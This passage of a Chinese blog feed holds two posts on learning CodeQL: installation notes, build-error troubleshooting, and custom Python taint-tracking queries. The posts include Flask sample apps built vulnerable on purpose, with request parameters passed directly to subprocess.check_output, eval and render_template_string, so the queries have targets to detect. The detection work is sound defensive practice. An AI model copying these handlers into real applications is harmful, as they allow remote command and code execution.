class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0Sink extends TaintSink &#123;</span><br><span class="line">    DangerousFunctionArg0Sink() &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call, DangerousFunctionArg0 dangerous_func |</span><br><span class="line">            call.getFunction().pointsTo(dangerous_func) and</span><br><span class="line">            call.getArg(0) &#x3D; this</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate sinks(TaintKind taint) &#123;</span><br><span class="line">        any()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        src.asCfgNode() instanceof FlaskRequestArgs</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        sink.asCfgNode() instanceof DangerousFunctionArg0Sink</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">         extension instanceof AnyCallFlow</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure><p>检测以下 sample, 一共 10 个漏洞, 都能找到, 还是不错的  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passby</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> i.split(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index8')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index8</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index9')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index9</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index10')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index10</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index11')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index11</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index12')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index12</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>最后, 其实感觉编写最大的难点还是需要思维的转换, 这种声明式的语言像 SQL 一样, 是告诉程序, 希望在 xx 地方是 xx, 且 xx 里面的 yy 是 zz 这样.<br>需要一点时间来转变思维吧, 之后是这个官方 python 接口库感觉本身写的就有点乱 (逃, 各种类似的对象, 又是 PythonFunctionCall, CallNode 的, 同样的目的可以由一万种不同的方式达成. 感觉对新手确实不太友好. 等后续文档跟上吧.  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先需要解决的就是上次留下的问题, 添加自定义的 taint track.&lt;br&gt;在自带的 tests 中就有示例, 可以参考 &lt;code&gt;ql/python/ql/test/library-tests/taint/extensions/ExtensionsLib.qll&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="codeql" scheme="https://rmb122.com/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>Codeql 踩坑记录</title>
    <link href="https://rmb122.com/2020/03/30/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <id>https://rmb122.com/2020/03/30/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-30T15:24:40.000Z</published>
    <updated>2020-05-29T10:57:53.734Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>入口: <a href="https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html</a><br>下载地址: <a href="https://github.com/github/codeql-cli-binaries/releases" target="_blank" rel="noopener">https://github.com/github/codeql-cli-binaries/releases</a><br>license: <a href="https://securitylab.github.com/tools/codeql/license" target="_blank" rel="noopener">https://securitylab.github.com/tools/codeql/license</a>  </p><a id="more"></a><p>license 里面有写:  </p><p>Further, except (and only to the extent) permitted by applicable law or applicable third-party license, you will not (and have no right to):</p><p>work around any technical limitations in the Software that only allow you to use it in certain ways;<br><strong>reverse engineer</strong>, decompile or disassemble the Software;<br>remove, minimize, block, or modify any notices of GitHub or its suppliers in the Software;<br>use the Software in any way that is against the law; or<br>share, publish, distribute or lend the Software, provide or make available the Software as a hosted solution (whether on a standalone basis or combined, incorporated or integrated with other software or services) for others to use, or transfer the Software or these Terms to any third party.</p><p>GitHub CodeQL can only be used on codebases that are released under an OSI-approved open source license, or to perform academic research. It can’t be used to generate CodeQL databases for or during automated analysis, continuous integration or continuous delivery, whether as part of normal software engineering processes or otherwise. For these uses, contact the sales team.</p><p>大概意思就是: 主程序是闭源的, 但是检测规则是开源的, 其中一些 <a href="https://github.com/github/codeql-go" target="_blank" rel="noopener">extractor</a> 也开源了, 当然其实 java 写的未混淆, 跟开源差不多.<br>用于学术研究或者检测开源项目都随便使用, 但是拿来商业等操作, 就需要购买商业 license.  </p><p>主程序就在 tools/codeql.jar, 也没做混淆啥的. 还是挺良心的.<br>安装包里面自带了运行环境和支持语言的 extractor (甚至自带 java 运行环境), 开箱即用.  </p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先写个测试用例看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $ cat flask-example/app.py</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>建立 database  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql database create codeql-database --language=python --<span class="built_in">source</span>-root flask-example</span><br></pre></td></tr></table></figure><p>然后就喜闻乐见的出错了 233</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[2020-03-30 17:45:00] [build] [INFO] [8] Extracted module _lzma in 22ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;dsa.py in 765ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;serialization&#x2F;ssh.py in 404ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;encode_asn1.py in 1572ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [ERROR] [1] Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;worker.py&quot;, line 220, in _extract_loop</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;super_extractor.py&quot;, line 47, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;builtin_extractor.py&quot;, line 14, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted module _io in 50ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [8] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;asymmetric&#x2F;dh.py in 373ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;wrappers&#x2F;cors.py in 85ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [7] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;argparse.py in 5850ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [2] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;tarfile.py in 5602ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;debug&#x2F;repr.py in 611ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [4] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;jinja2&#x2F;parser.py in 2626ms</span><br><span class="line">[2020-03-30 17:45:03] [build] [ERROR] Process 6 timed out</span><br><span class="line">[2020-03-30 17:45:04] [build-err] Traceback (most recent call last):</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;index.py&quot;, line 19, in &lt;module&gt;</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     buildtools.index.main()</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python3src.zip&#x2F;buildtools&#x2F;index.py&quot;, line 110, in main</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;subprocess.py&quot;, line 364, in check_call</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     raise CalledProcessError(retcode, cmd)</span><br><span class="line">[2020-03-30 17:45:04] [build-err] subprocess.CalledProcessError: Command &#39;[&#39;python3&#39;, &#39;-S&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python_tracer.py&#39;, &#39;-v&#39;, &#39;-z&#39;, &#39;all&#39;, &#39;-c&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;codeql-database&#x2F;working&#x2F;trap_cache&#39;, &#39;-p&#39;, &#39;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#39;, &#39;-R&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;flask-example&#39;]&#39; returned non-zero exit status 1.</span><br><span class="line">[2020-03-30 17:45:04] [ERROR] Spawned process exited abnormally (code 1; tried to run: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh])</span><br><span class="line">A fatal error occurred: Exit status 1 from command: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh]</span><br></pre></td></tr></table></figure><p>问题出在这<br>Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory  </p><p>repl 里面运行一下, 果然也是如此  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line">Python 3.8.2 (default, Feb 26 2020, 22:21:03) </span><br><span class="line">[GCC 9.2.1 20200130] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import _decimal</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>神奇的居然没有装, pacman -S mpdecimal 装一个就完事了.<br>这应该只扫了用到的库, 没有扫全部的库, 挺快的, 点个赞.  </p><p>接下来真正开始写 ql<br>教程在这:<br><a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">https://help.semmle.com/QL/learn-ql/</a><br><a href="https://help.semmle.com/QL/ql-handbook/" target="_blank" rel="noopener">https://help.semmle.com/QL/ql-handbook/</a><br><a href="https://help.semmle.com/qldoc/" target="_blank" rel="noopener">https://help.semmle.com/qldoc/</a>  </p><p>官方的规则库:<br><a href="https://github.com/Semmle/ql.git" target="_blank" rel="noopener">https://github.com/Semmle/ql.git</a><br>学习一哈.  </p><p>官方自带的 ql 里面有预先定义好一些数据结构, 直接 import python 就能用了, .qll 是 library, .ql 是真正的查询语句.<br>正式运行还需要定义一个 qlpack.yml, 意义跟 pom.xml 差不多吧, 定义包名和依赖<br><a href="https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html</a>  </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">com-rmb122-test</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-python</span></span><br><span class="line"><span class="attr">extractor:</span> <span class="string">python</span></span><br></pre></td></tr></table></figure><p>在 <code>$HOME/.config/codeql/config</code> 里面设置 ql repo 的路径, 这样才能被 import, 感觉现在这种手动配置好蛋痛 =.= 感觉跟自己编译 cpp 一样链接一堆库<br>而且文档 u1s1, 挺乱的, 不过刚被 github 收购, 可以理解, 希望之后能更方便一点.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--search-path &lt;path to ql repo&gt;</span><br></pre></td></tr></table></figure><p>注意不要写成 <code>--search-path=&lt;path to ql repo&gt;</code>, 不然识别不了… 坑了我好久.  </p><p>然后保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName().matches(&quot;index&quot;)</span><br><span class="line">select f, &quot;This is a function called get...&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql query run test.ql -d ../codeql-database/</span><br></pre></td></tr></table></figure><p>就能运行了, 或者用 vscode 插件也行, 更方便一点. 可以找到我们写的 index 函数.  </p><h2 id="简单的-Taint-demo"><a href="#简单的-Taint-demo" class="headerlink" title="简单的 Taint demo"></a>简单的 Taint demo</h2><p>照着自带的示例, 可以依葫芦画瓢, 写出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        exists(FlaskRequestArgs taintSrc |</span><br><span class="line">            src.asCfgNode() &#x3D; taintSrc </span><br><span class="line">            &#x2F;&#x2F; and taintSrc.isSourceOf(kind) 这里示例用的 get, 不是 dickstring 这个 kind, 所以需要注释掉</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call |</span><br><span class="line">            call.getFunction().pointsTo(Value::named(&quot;subprocess.check_output&quot;)) and</span><br><span class="line">            call.getArg(0) &#x3D; sink.asCfgNode()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure><p>再检测一下威力加强版示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>结果是 index, index5-7 都能检测出来, 2-4 没检测出来. 原因应该是 spilt 的结果没被 taint 到.<br>将 isSink 替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node 